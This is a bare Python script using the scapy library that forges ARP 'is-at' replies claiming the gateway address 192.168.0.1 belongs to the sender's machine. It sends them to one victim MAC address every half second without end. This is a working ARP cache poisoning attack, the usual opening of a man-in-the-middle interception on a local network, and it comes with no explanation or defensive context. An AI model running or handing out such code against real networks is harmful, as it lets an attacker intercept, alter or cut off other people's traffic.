#!/usr/bin/python3

from scapy.all import *

paket = Ether(src = "08:00:27:be:0c:78", dst = "40:9C:28:51:1F:11") / ARP(op = "is-at", psrc = "192.168.0.1", hwsrc = "08:00:27:be:0c:78")

sendp(paket, loop = 1, inter = 0.5)


